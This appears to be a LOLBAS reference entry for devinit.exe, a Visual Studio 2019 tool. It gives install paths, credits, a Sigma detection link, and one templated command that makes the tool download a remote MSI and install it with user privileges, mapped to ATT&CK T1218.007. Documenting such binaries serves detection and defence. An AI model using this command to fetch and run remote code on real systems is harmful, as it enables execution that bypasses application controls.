---
title: "Devinit.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devinit/
fetched_at: 2026-09-20T17:14:35Z
license: unspecified
category: windows
---

Visual Studio 2019 tool

## Paths
- C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe
- C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe

## Resources
- [https://twitter.com/mrd0x/status/1460815932402679809](https://twitter.com/mrd0x/status/1460815932402679809)

## Acknowledgements
- mr.d0x ([@mrd0x](https://twitter.com/@mrd0x))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml)

## Execute

1. Downloads an MSI file to C:\Windows\Installer and then installs it.

```
devinit.exe run -t msi-install -i {REMOTEURL:.msi}
```

   - Use case: Executes code from a (remote) MSI file.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1218.007

   - Tags: Execute: MSIExecute: Remote
